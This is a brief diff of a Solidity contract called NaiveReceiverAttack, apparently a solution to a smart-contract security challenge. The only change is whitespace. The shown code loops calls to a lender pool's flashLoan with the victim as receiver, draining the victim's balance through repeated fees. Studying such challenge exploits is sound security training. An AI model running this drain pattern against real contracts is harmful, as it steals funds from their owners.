@@ -16,5 +16,5 @@ contract NaiveReceiverAttack {
         while (victim.balance >= FIXED_FEE) {
             INaiveReceiverLenderPool(lenderPool).flashLoan(victim, 0);
         }
-	}
+    }
 }
